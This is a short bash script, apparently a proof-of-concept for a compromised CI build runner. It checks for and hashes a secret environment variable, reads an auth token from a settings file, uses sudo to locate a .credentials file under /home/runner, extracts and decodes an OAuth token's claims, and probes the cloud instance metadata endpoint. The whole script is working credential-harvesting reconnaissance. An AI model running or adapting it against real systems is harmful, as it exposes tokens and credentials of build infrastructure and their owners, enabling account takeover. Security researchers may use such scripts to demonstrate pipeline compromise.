#!/bin/bash
# v4: identity inventory with fixed credential lookup.
echo "build: secret env present: $([ -n "$DECOY_APP_KEY" ] && echo yes || echo no)"
echo "EXFIL-PROOF $(printf %s "$DECOY_APP_KEY" | sha256sum | cut -d" " -f1)"
wtok=$(jq -r .authToken /opt/hca/.settings 2>/dev/null)
echo "IDENTITY-PROOF worker_jwt_len=${#wtok}"
CFILE=$(sudo find /home/runner -maxdepth 4 -name .credentials 2>/dev/null | head -1)
[ -z "$CFILE" ] && CFILE=$(find /home/runner -maxdepth 4 -name .credentials 2>/dev/null | head -1)
echo "IDENTITY-PROOF credentials_path=$CFILE bytes=$(wc -c < "$CFILE" 2>/dev/null)"
otok=$(jq -r .Data.token "$CFILE" 2>/dev/null)
echo "IDENTITY-PROOF oauth_len=${#otok}"
cl=$(printf '%s' "$otok" | cut -d. -f2); p=$(( (4 - ${#cl} % 4) % 4 )); [ "$p" -ne 0 ] && cl="$cl$(printf '=%.0s' $(seq 1 $p))"
echo "IDENTITY-PROOF oauth_claims $(printf '%s' "$cl" | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{owner_id, billing_owner_id, labels, runner_type, exp}')"
echo "IDENTITY-PROOF imds_orchestrator $(curl -sS -m 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null | jq -r '.compute.tagsList[]? | select(.name=="hosted_compute.base_ro_url") | "reachable"' 2>/dev/null)"
